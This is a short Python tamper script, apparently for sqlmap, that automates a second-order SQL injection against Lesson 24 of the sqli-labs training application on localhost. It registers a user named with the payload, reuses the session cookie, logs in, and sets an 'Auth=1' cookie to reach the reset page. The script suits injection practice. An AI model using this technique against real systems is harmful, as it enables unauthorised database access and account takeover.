#!/usr/bin/env python

import httplib2, urllib
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def makeRequest(url, post, headers):
    return httplib2.Http().request(url, "POST", urllib.urlencode(post), headers)

def tamper(payload, **kwargs):
    """
    Custom second order injection - Lesson 24
    """

    #headers array
    headers = kwargs.get("headers", {})
    headers['Content-type'] = 'application/x-www-form-urlencoded'


    createUserPostData = {'username':payload,
                 'password':'password',
                 're_password':'password',
                 'submit':1}
    createUserUrl = "http://localhost/sqli-labs/Less-24/login_create.php"

    #lets create username with payload's value by requesting login_create
    response, body = makeRequest(createUserUrl, createUserPostData, headers)

    #initial response sets PHPSESSID cookie, lets reuse it in all following requests
    headers['Cookie'] = response['set-cookie']

    loginPostData = {'login_user':payload,
                'login_password':'password'}
    loginUrl = "http://localhost/sqli-labs/Less-24/login.php"

    #lets login to populate username session variable server side
    makeRequest(loginUrl, loginPostData, headers)

    #add Auth to allow access to reset login page
    headers['Cookie'] += "; Auth=1"

    return ""


